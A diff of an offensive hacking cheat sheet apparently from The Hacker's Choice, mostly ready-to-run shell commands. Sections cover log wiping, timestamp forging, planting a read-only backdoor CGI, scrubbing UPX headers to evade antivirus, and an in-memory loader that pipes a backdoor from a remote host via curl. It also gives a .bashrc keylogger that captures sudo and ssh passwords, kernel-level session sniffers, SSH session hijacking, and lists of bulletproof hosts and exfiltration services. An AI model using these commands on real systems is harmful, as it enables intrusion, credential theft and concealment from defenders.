+Find Subdomains or emails in files:
+```bash
+resolv() { while read -r x; do r="$(getent hosts "$x")" || continue; echo "${r%% *}"$'\t'"${x}"; done; }
+find_subdomains() {
+	local d="${1//./\\.}"
+	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
+	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
+	[ $# -le 0 ] && { echo -en >&2 "Extract sub-domains from all files (or stdin)\nUsage  : find_subdomains <apex-domain> <file>\nExample: find_subdomain .com | anew"; return; }
+	shift 1
+	[ $# -le 0 ] && [ -t 0 ] && set -- .
+	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
+	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
+}
+# find_subdomain .foobar.com | anew | resolv
+# find_subdomain @gmail.com | anew
 ```
 
 ---
 <a id="shell-hacks"></a>
-## 7. Shell Hacks
+## 8. Shell Hacks
 <a id="shred"></a>
-**7.i. Shred & Erase a file**
+**8.i. Shred & Erase a file**
 
 ```sh
 shred -z foobar.txt
@@ -1230,10 +1903,9 @@ shred -z foobar.txt
 
 ```sh
 ## SHRED without shred command
-shred()
-{
+shred() {
     [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
-    dd bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
+    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
     rm -f "${1:?}"
 }
 shred foobar.txt
@@ -1243,16 +1915,19 @@ Note: Or deploy your files in */dev/shm* directory so that no data is written to
 Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
 
 <a id="restore-timestamp"></a>
-**7.ii. Restore the date of a file**
+**8.ii. Restore the date of a file**
 
-Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
+Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modified. Use *touch* to change the file date to the date of another file (in this example, */etc/shadow*)
 
 ```sh
 touch -r /etc/shadow /etc/passwd
+# verify with 'stat /etc/passwd'
 ```
 
+Use [hackshell](#hackshell) and `ctime /etc/passwd` to also adjust the ctime and birth-time.
+
 <a id="shell-clean-logs"></a>
-**7.iii. Clear logfile**
+**8.iii. Clear logfile**
 
 This will reset the logfile to 0 without having to restart syslogd etc:
 ```sh
@@ -1261,15 +1936,18 @@ This will reset the logfile to 0 without having to restart syslogd etc:
 
 This will remove any line containing the IP `1.2.3.4` from the log file:
 ```sh
-#DEL=thc.org
-#DEL=${SSH_CLIENT%% *}
-DEL=1.2.3.4
-LOG=/var/log/auth.log
-IFS="" a=$(sed "/${DEL}/d" <"${LOG}") && echo "$a">"${LOG}"
+xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
+```
+
+Examples:
+```sh
+# xlog "1\.2\.3\.4" /var/log/auth.log
+# xlog "${SSH_CLIENT%% *}" /var/log/auth.log
+# xlog "^2023.* thc\.org" foo.log
 ```
 
 <a id="shell-hide-files"></a>
-**7.iv. Hide files from that User without root privileges**
+**8.iv. Hide files from that User without root privileges**
 
 Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.
 
@@ -1296,26 +1974,126 @@ mkdir $'\t'
 cd $'\t'
 ```
 
-<a id="linux-info"></a>
-**7.v. Find out Linux Distro**
+<a id="perm-files"></a>
+**8.v. Make a file immuteable**
 
+This will redirect `/var/www/cgi/blah.cgi` to `/boot/backdoor.cgi`. The file `blah.cgi` can not be modified or removed (unless unmounted).
 ```sh
-# Find out Linux Distribution
-uname -a; lsb_release -a; cat /etc/*release /etc/issue* /proc/version
+# /boot/backdoor.cgi contains our backdoor
+touch /var/www/cgi/blah.cgi
+mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
 ```
 
+<a id="nosudo"></a>
+**8.vi. Change user without sudo/su**
+
+Needed for taking screenshots of X11 sessions (aka `xwd -root -display :0 | convert - jpg:screenshot.jpg`)
+```bash
+xsu() {
+    local name="${1:?}"
+    local u g h
+    local cmd="python"
+
+    command -v python3 >/dev/null && cmd="python3"
+    [ $UID -ne 0 ] && { HS_ERR "Need root"; return; }
+    u=$(id -u ${name:?}) || return
+    g=$(id -g ${name:?}) || return
+    h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)" || return
+    HOME="${h:-/tmp}" "$cmd" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
+}
+# xsu user
+```
+
+<a id="payload"></a>
+**8.vii. Obfuscate and crypt paypload**
+
+Use [UPX](https://github.com/upx/upx) to pack an ELF binary (example `/bin/id`):
+```shell
+BIN="mybin"
+upx -qqq /bin/id -o "${BIN}"
+```
+
+Cleanse the [UPX header](https://github.com/upx/upx/blob/devel/src/stub/src/include/header.S) and 2nd ELF header to fool the Anit-Virus:
+```shell
+perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\0\0\0\0\0\0\0\0/s' "${BIN}"
+perl -i -0777 -pe 's/^(.{64})(.{0,256})\x7fELF/$1$2\0\0\0\0/s' "${BIN}"
+```
+
+Optionally cleanse signatures and traces of UPX:
+```shell
+cat "${BIN}" \
+| perl -e 'local($/);$_=<>;s/(.*)(\$Info:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' \
+| perl -e 'local($/);$_=<>;s/(.*)(\$Id:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' \
+| perl -e 'local($/);$_=<>;s/(.*)(PROT_EXEC\|PROT_WRI[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx"
+cat "${BIN}.tmpupx" >"${BIN}"
+rm -f "${BIN}.tmpupx"
+perl -i -0777 -pe 's/UPX!/\0\0\0\0/sg' "${BIN}"
+```
+
+Verify that binary can not be unpacked:
+```shell
+upx -d "${BIN}"  # Should fail with 'not packed by UPX'
+```
+
+Optionally encrypt it with [Ezuri](https://github.com/guitmz/ezuri) thereafter.
+
+<a id="memexec"></a>
+**8.viii. Deploying a backdoor without touching the file-system**
+
+How to start a backdoor without writing to the file-system or when all writeable locations are mounted with the evil `noexec`-flag.
+
+A Perl one-liner to load a binary into memory and execute it (without touching any disk or /dev/shm or /tmp).
 ```sh
-# Speed check the system
-curl -sL bench.sh | bash
-# Another speed check:  
-# curl -sL yabs.sh | bash
+memexec() {
+    local stropen strread
+    local strargv0='"foo", '
+    [ -t 0 ] && {
+        stropen="open(\$i, '<', '$1') or die 'open: \$!';"
+        strread='$i'
+        unset strargv0
+    }
+    # Check Syscall-NR: perl -e 'require "sys/syscall.ph"; printf &SYS_memfd_create;'
+    perl -e '$f=syscall(319, $n="", 1);
+if(-1==$f){ $f=syscall(279, $n="", 1); if(-1==$f){ die "memfd_create: $!";}}
+'"${stropen}"'
+open($o, ">&=".$f) or die "open: $!";
+while(<'"${strread:-STDIN}"'>){print $o $_;}
+exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
+}
+# Example usage:
+# memexec /usr/bin/id -u
+# cat /usr/bin/id | memexec -u
+# curl -SsfL https://thc.org/my-backdoor-binary | memexec
+```
+
+The shortest possible variant is (example):
+```shell
+memexec(){ perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
+# Example: cat /usr/bin/id | memexec -u
+```
+(Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions and [previous work](https://captain-woof.medium.com/how-to-execute-an-elf-in-memory-living-off-the-land-c7e67dbc3100) by others)
+
+Deploy gsocket without writing to the filesystem (example):
+```sh
+GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m))
+```
+
+The backdoor can also be piped via SSH directly into the remote's memory, and executed:
+```sh
+MX='-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec perl '$MX' -- -ilqD -s SecretChangeMe31337"
+```
+
+If you have a single-shot at remote executing a command (like via a PHP exploit) then this is your line:
+```sh
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- -ilqD -s SecretChangeMe31337
 ```
 
 ---
 <a id="crypto"></a>
-## 8. Crypto
+## 9. Crypto
 <a id="gen-password"></a>
-**8.i. Generate quick random Password**
+**9.i. Generate quick random Password**
 
 Good for quick passwords without human element.
 
@@ -1336,34 +2114,32 @@ head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16
 ```
 
 <a id="crypto-filesystem"></a>
-**8.ii.a. Linux transportable encrypted filesystems - cryptsetup**
+**9.ii.a. Linux transportable encrypted filesystems - cryptsetup**
 
 Create a 256MB large encrypted file system. You will be prompted for a password.
 
 ```sh
 dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
 cryptsetup luksFormat /tmp/crypted
-mkfs.ext3 /tmp/crypted
+cryptsetup open /tmp/crypted sec
+mkfs -t ext3 /dev/mapper/sec
 ```
 
 Mount:
 
 ```sh
-losetup -f
-losetup /dev/loop0 /tmp/crypted
-cryptsetup open /dev/loop0 crypted
-mount -t ext3 /dev/mapper/crypted /mnt/crypted
+cryptsetup open /tmp/crypted sec
+mount -o nofail,noatime /dev/mapper/sec /mnt/sec
 ```
 
 Store data in `/mnt/crypted`, then unmount:
 
 ```sh
-umount /mnt/crypted
-cryptsetup close crypted
-losetup -d /dev/loop0
+umount /mnt/sec
+cryptsetup close sec 
 ```
 <a id="encfs"></a>
-**8.ii.b. Linux transportable encrypted filesystems - EncFS**
+**9.ii.b. Linux transportable encrypted filesystems - EncFS**
 
 Create ```.sec``` and store the encrypted data in ```.raw```:
 ```sh
@@ -1377,9 +2153,9 @@ fusermount -u .sec
 ```
 
 <a id="encrypting-file"></a>
-**8.iii Encrypting a file**
+**9.iii Encrypting a file**
 
-Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):
+Encrypt your 0-Days and log files before transferring them - please. (and pick your own password):
 
 ```sh
 # Encrypt
@@ -1392,28 +2168,94 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 ```
 
 ---
-<a id="ssh-sniffing"></a>
-## 9. SSH Sniffing
+<a id="sniffing"></a>
+## 10. Session sniffing and hijaking
+<a id="session-sniffing"></a>
+**10.i Sniff a user's SHELL session**
+
+A 1-liner for `~/.bashrc` to sniff the user's keystrokes and save them to `~/.config/.pty/.@*`. Useful when not root and needing to capture the sudo/ssh/git credentials of the user. 
+
+Deploy: Cut & paste the following onto the target and follow the instructions:
+```sh
+command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
+&& { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
+&& curl -o ~/.config/.pty/pty -fsSL "https://bin.ajam.dev/$(uname -m)/Baseutils/util-linux/script" \
+&& curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
+&& chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
+&& echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
+&& echo -e '[ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec -a -bash '"$(command -v bash)"'" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
+```
+
+- Combined with zapper to hide command options from the process list.
+- Requires `/usr/bin/script` from util-linux >= 2.37 (-I flag). We pull the static bin from [ajam](https://bin.ajam.dev). 
+- Consider using /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+- Log in with `ssh -o "SetEnv LC_PTY=1"` to disable logging.
+
+<a id="dtrace"></a>
+**10.ii Sniff all SHELL sessions with dtrace - FreeBSD**
+
+Especially useful for Solaris/SunOS and FreeBSD (pfSense). It uses kernel probes to trace *all* sshd processes.
+
+Copy this "D Script" to the target system to a file named `d`:
+```c
+#pragma D option quiet
+inline string NAME = "sshd";
+syscall::write:entry
+/(arg0 >= 5) && (arg2 <= 16) && (execname == NAME)/
+{ printf("%d: %s\n", pid, stringof(copyin(arg1, arg2))); }
+```
+
+Start a dtrace and log to /tmp/.log:
+```sh
+### Start kernel probe as background process.
+(dtrace -sd >/tmp/.log &)
+```
+
+<a id="bpf"></a>
+**10.iii Sniff all SHELL sessions with eBPF - Linux**
+
+eBPF allows us to *safely* hook over 120,000 functions in the kernel. It's like a better "dtrace" but for Linux.  
+
+```sh
+curl -o bpftrace -fsSL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
+chmod 755 bpftrace
+curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
+./bpftrace -Bnone ptysnoop.bt
+```
+Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://github.com/hackerschoice/bpfhacks).
+
 <a id="ssh-sniffing-strace"></a>
-**9.i Sniff a user's SSH session with strace**
+**10.iv Sniff a user's SSH, bash or SSHD session with strace**
 ```sh
-strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
+tit() {
+	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
+	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+}
+# tit read $(pidof -s ssh)
+# tit read $(pidof -s bash)
+# tit write $(pgrep -f 'sshd.*pts' | head -n1)
 ```
-Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
-
-<a id="ssh-sniffing-script"></a>
-**9.ii Sniff a user's SSH session with script**
-
-The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
+It is also possible to sniff the SSHD process (captures also sudo passwords etc). Note that we trace the `write()` call instead (because sshd 'writes' data to the bash):
 ```sh
-echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
+# Find the sshd PID that spawned the bash:
+ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep'
+...
+UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
+paralle+    7770    7764  0  5088  6780   1 Aug28 ?        00:00:05 sshd: parallels@pts/0
+paralle+    9056    9050  0  5088  6652   1 Aug28 ?        00:00:00 sshd: parallels@pts/1
+paralle+   11938   11932  0  5074  6772   1 10:59 ?        00:00:00 sshd: parallels@pts/3
+...
 ```
-Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+
+Sniff 7770 (example):
+```shell
+tit write 7770
+```
 
 <a id="ssh-sniffing-wrapper"></a>
-**9.iii. Sniff a user's SSH session with a wrapper script**
+**10.v. Sniff a user's outgoing SSH session with a wrapper script**
 
-Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
+Even dirtier method in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH sessions)
 
 Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
 <details>
@@ -1457,19 +2299,30 @@ To uninstall cut & paste this\033[0m:\033[1;36m
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
 <a id="ssh-sniffing-sshit"></a>
-**9.iv Sniff a user's SSH session using SSH-IT**
+**10.vi Sniff a user's outgoing SSH session using SSH-IT**
 
 The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).
 
 ```sh
-bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
+```
+
+<a id="hijack"></a>
+**10.vii Hijack / Take-over a running SSH session**  
+
+Use [https://github.com/nelhage/reptyr](https://github.com/nelhage/reptyr) to take over an existing SSH session:
+```sh
+ps ax -o pid,ppid,cmd | grep 'ssh '
+./reptyr -T <SSH PID>
+### or: ./reptyr -T $(pidof -s ssh)
+### Must use '-T' or otherwise the original user will see that his SSH process gets suspended.
 ```
 
 ---
 <a id="vpn-shell"></a>
-## 10. VPN & Shells
+## 11. VPN & Shells
 <a id="shell"></a>
-**10.i. Disposable Root Servers**
+**11.i. Disposable Root Servers**
 
 ```console
 $ ssh root@segfault.net # Use password 'segfault'
@@ -1478,7 +2331,7 @@ $ ssh root@segfault.net # Use password 'segfault'
 https://thc.org/segfault
 
 <a id="vpn"></a>
-**10.ii. VPN/VPS/Proxies**
+**11.ii. VPN/VPS/Proxies**
 
 Trusted VPN Providers
 1. https://www.mullvad.net
@@ -1488,14 +2341,17 @@ Trusted VPN Providers
 
 Virtual Private Servers
 1. https://www.hetzner.com - Cheap
+2. https://hivecloud.pw - No KYC. Bullet Proof. Accepts Crypto.
 1. https://dmzhost.co - Ignore most abuse requests
-2. https://alexhost.com - DMCA free zone
+2. https://alexhost.com - No KYC. Bullet Proof. DMCA free zone
 3. https://basehost.eu - Ignores court orders
 4. https://buyvm.net - Warez best friend
 5. https://serverius.net - Used by gangsters
 6. https://1984.hosting - Privacy
 7. https://bithost.io - Reseller for DigitalOcean, Linode, Hetzner and Vultr (accepts Crypto)
 8. https://www.privatelayer.com - Swiss based.
+
+See [other KYC Free Services](https://kycnot.me/) ([.onion](http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/))
 
 Proxies (we dont use any of those)
 1. [V2Ray Proxies](https://github.com/mahdibland/V2RayAggregator)
@@ -1514,12 +2370,33 @@ Many other services (for free)
 
 ---
 <a id="osint"></a>
-## 11. Intelligence Gathering
+## 12. Intelligence Gathering
+
+Reverse DNS from multiple public databases:
+```sh
+rdns () {
+    curl -fsSL "https://ip.thc.org/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
+}
+# rdns <IP>
+```
+
+Find sub domains from TLS Database:
+```sh
+crt() {
+    [ $# -ne 1 ] && { echo >&2 "crt <domain-name>"; return 255; }
+    curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
+}
+# crt <domain>
+```
 
 | OSINT Hacker Tools ||
 | --- | --- |
-| https://osint.sh | Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search and much more |
+| https://api.c99.nl | Free: [Subdomain Finder](https://subdomainfinder.c99.nl), PAID: Phone-Lookup, CF Resolver, WAF Detector, IP2Host, and more...for $25/year. |  
+| https://osint.sh | Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search, and more |
 | https://cli.fyi | Free. curl/json interface to many services. Try `curl cli.fyi/me` or `curl cli.fyi/thc.org`. |
+| https://check-your-website.server-daten.de | Free. TLS/DNS/Security check a domain. |
+| https://ipsniper.info/api.html | rDNS/fDNS and other IP information tools |
+| https://ip.thc.org | fDNS/rDNS lookup: `curl -fL ip.thc.org/140.82.121.3` |
 | https://hackertarget.com/ip-tools/ | Free OSINT Service (Reverse IP, MTR, port scan, CMS scans, Vulnerability Scans, API support) |
 | https://account.shodan.io/billing/tour | Open Port DB & DNS Lookup from around the world |
 | https://dnsdumpster.com/ | Domain Recon Tool |
@@ -1527,7 +2404,7 @@ Many other services (for free)
 | https://archive.org/web/ | Historical view of websites |
 | https://www.farsightsecurity.com/solutions/dnsdb/ | DNS search (not free) |
 | https://wigle.net/ | Wireless Network Mapper |
-| https://radiocells.org/ | Cell Tower Informations |
+| https://radiocells.org/ | Cell Tower Information |
 | https://www.shodan.io/ | Search Engine to find devices & Banners (not free) |
 | https://spur.us/context/me | IP rating `https://spur.us/context/<IP>` |
 | http://drs.whoisxmlapi.com | Reverse Whois Lookup (not free) |
@@ -1546,19 +2423,23 @@ Many other services (for free)
 
 ---
 <a id="misc"></a>
-## 12. Miscellaneous
+## 13. Miscellaneous
 <a id="tools"></a>
-**12.i. Tools of the trade**
+**13.i. Tools of the trade**
 
 Comms
 1. [CryptoStorm Email](https://www.cs.email/) - Disposable emails (send & receive). (List of [Disposable-email-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services])).
 1. [Temp-Mail](https://temp-mail.org/en/) - Disposable email service with great Web GUI. Receive only.
+2. [tuta.io](https://tuta.io) or [ProtonMail](https://pm.me)/[.onion](https://protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd.onion/) - Free & Private email
 1. [Quackr.Io](https://quackr.io/) - Disposable SMS/text messages (List of [Disposable-SMS-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-SMS-services)).
+1. [SMS-Man](https://sms-man.com) - Anonymous SMS/text that work with Signal, WA, and manh others 
 1. [Crypton](https://crypton.sh/) - Rent a private SIM/SMS with crypto ([.onion](http://cryptonx6nsmspsnpicuihgmbbz3qvro4na35od3eht4vojdo7glm6yd.onion/))
+2. [List of "No KYC" Services](https://kycnot.me/) ([.onion](http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/))
 
 OpSec
 1. [OpSec for Rebellions](https://medium.com/@hackerschoice/it-security-and-privacy-for-the-rebellions-of-the-world-db4023cadcca) - Start Here. The simplest 3 steps.
 1. [RiseUp](https://riseup.net/) - Mail, VPN and Tips for (online) rebellions.
+2. [CryptoPad](https://cryptpad.fr)/[DisRoot](https://disroot.org/eng) - IT infra to stage a rebellion.
 1. [Neko](https://github.com/m1k1o/neko) - Launch Firefox in Docker and access via 127.0.0.1:8080 (WebRTC)
 2. [x11Docker](https://github.com/mviereck/x11docker) - Isolate any X11 app in a container (Linux & Windows only). ([Article](https://techviewleo.com/run-gui-applications-in-docker-using-x11docker/?expand_article=1))
 3. [DangerZone](https://github.com/freedomofpress/dangerzone) - Make PDFs safe before opening them.
@@ -1566,14 +2447,19 @@ OpSec
 5. [EFF](https://www.eff.org/) - Clever advise for freedom figthers.
 
 Exploits
+1. [ttyinject](https://github.com/hackerschoice/ttyinject) and [ptyspy](#10-session-sniffing-and-hijaking) for LPE.
+1. [SploitScan](https://github.com/xaitax/SploitScan) - Exploit Score & PoC search (by xaitax)
 1. [Traitor](https://github.com/liamg/traitor) - Tries various exploits/vulnerabilities to gain root (LPE)
 1. [PacketStorm](https://packetstormsecurity.com) - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
 1. [ExploitDB](https://www.exploit-db.com) - Also includes metasploit db and google hacking db
 1. [Shodan/Exploits](https://exploits.shodan.io/welcome) - Similar to exploit-db
 
 System Information Gathering
-1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system informations for hackers.
+1. `curl -fsSL https://thc.org/ws | bash` - Show all domains hosted on a server + system-information
+1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system information for hackers.
 1. https://github.com/zMarch/Orc - Post-exploit tool to find local RCE (type `getexploit` after install)
+1. https://github.com/The-Z-Labs/linux-exploit-suggester - Suggest exploits based on versions on target system 
+1. https://github.com/efchatz/pandora - Windows: dump password from various password managers
 
 Backdoors
 1. https://www.gsocket.io/deploy - The world's smallest backdoor
@@ -1585,7 +2471,7 @@ Network Scanners
 1. https://github.com/ptrrkssn/pnscan - Fast network scanner
 1. https://zmap.io/ - ZMap & ZGrab
 
-Vulnerability Scanners
+Vulnerability Scanners (be aware: these all yield 99% non-exploitable false positives. They all suck.)
 1. [Raccoon](https://github.com/evyatarmeged/Raccoon) - Reconnaissance and Information Gathering
 1. [Osmedeus](https://github.com/j3ssie/osmedeus) - Vulnerability and Information gathering
 1. [FullHunt](https://github.com/fullhunt/) - log4j and spring4shell scanner 
@@ -1593,8 +2479,10 @@ Vulnerability Scanners
 DDoS
 1. [DeepNet](https://github.com/the-deepnet/ddos) - we despise DDoS but if we had to then this would be our choice.
 
-Static Binaries / Warez
+Static Binaries / pre-compiled Tools
+1. https://bin.ajam.dev ([github](https://github.com/Azathothas/Toolpacks/tree/main), [hysp project](https://github.com/metis-os/hysp-pkgs))
 1. https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
+2. https://lolbas-project.github.io/ (Windows)
 1. https://iq.thc.org/cross-compiling-exploits
 
 Phishing
@@ -1603,23 +2491,24 @@ Phishing
 
 Tools
 1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
-1. https://tmate.io/ - Share A screen with others
+1. https://tmate.io/ - Share a screen with others
 
 Callback / Canary / Command & Control
-1. http://dnslog.cn
 1. https://app.interactsh.com
 1. https://api.telegram.org
 1. https://webhook.site
 
 Tunneling
 1. [Gost](https://github.com/ginuerzh/gost/blob/master/README_en.md)
-1. [TCP Gender Changer](https://tgcd.sourceforge.net/) for all your 'connect back' needs.
+1. [WireTap](https://github.com/sandialabs/wiretap) or [Segfault's WireGuard](https://www.thc.org/segfault/wireguard/).
 1. [ngrok](https://ngrok.com/download), [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps) or [pagekite](https://pagekite.net/) to make a server behind NAT accessible from the public Internet.
 
 Exfil<a id="cloudexfil"></a>
 1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
+2. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
 1. [Mega](https://mega.io/cmd)
 2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
+3. [0x0.at](https://0x0.st) - `curl -F'file=@foo.txt'  https://0x0.st/`
 5. [Transfer.sh](https://transfer.sh/) - `curl -T foo.txt https://transfer.sh`
 6. [LitterBox](https://litterbox.catbox.moe/tools.php) - `curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php`  
 7. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
@@ -1628,16 +2517,18 @@ Exfil<a id="cloudexfil"></a>
 Publishing
 1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
 1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok.
-1. [DuckDNS](https://www.duckdns.org/) - Free Dynamic Domain Names
-3. [afraid.org](https://www.afraid.org) - Free Dynamic DNS for your domain
-2. [he.net](https://dns.he.net/) - Free Nameserver service
-4. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
+1. [DuckDNS](https://www.duckdns.org/) - Free Domain Names
+1. [AnonDNS](https://anondns.net/) - Free Domain Name (anonymous)
+1. [afraid.org](https://www.afraid.org) - Free Dynamic DNS for your domain
+1. [he.net](https://dns.he.net/) - Free Nameserver service
+1. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
+1. [pad.riseup.net](https://pad.riseup.net) - Create documents and share them securely
 
 Forums and Conferences
-1. [0x00Sec](https://0x00sec.org/) - Reverse Engineering & Hacking with a pinch of Malware
-3. [AlligatorCon](https://www.alligatorcon.eu/) - the original
-4. [0x41con](https://0x41con.org/)
-5. [TumpiCon](https://tumpicon.org/)
+1. [AlligatorCon](https://www.alligatorcon.eu/) - the original
+1. [0x41con](https://0x41con.org/)
+1. [TumpiCon](https://tumpicon.org/)
+1. [0x00sec](https://0x00sec.org/)
 
 Telegram Channels<a id="channels"></a>
 1. [The Hacker's Choice](https://t.me/thcorg)
@@ -1646,33 +2537,38 @@ Telegram Channels<a id="channels"></a>
 1. [Offensive Twitter](https://t.me/OffensiveTwitter)
 1. [Pwn3rzs](https://t.me/Pwn3rzs)
 1. [VX-Underground](https://t.me/vxunderground)
-1. [cKure](https://t.me/cKure)
 1. [Android Security / Malware](https://t.me/androidMalware)
 1. [OSINT CyberDetective](https://t.me/cybdetective)
 1. [BookZillaaa](https://t.me/bookzillaaa)
 
 Mindmaps & Knowledge
-1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)
-1. [Z Library](https://singlelogin.me)/[Z Library on TOR](http://bookszlibb74ugqojhzhg2a63w5i2atv5bqarulgczawnbmsb6s6qead.onion/)
+1. [Compass Sec Cheat Sheets](https://github.com/CompassSecurity/Hacking_Tools_Cheat_Sheet)
+2. [Network Pentesting](https://github.com/wearecaster/NetworkNightmare/blob/main/NetworkNightmare_by_Caster.png)
+1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg)
 
 <a id="cool-linux-commands"></a>
-**12.ii. Cool Linux commands**
+**13.ii. Cool Linux commands**
 
 1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
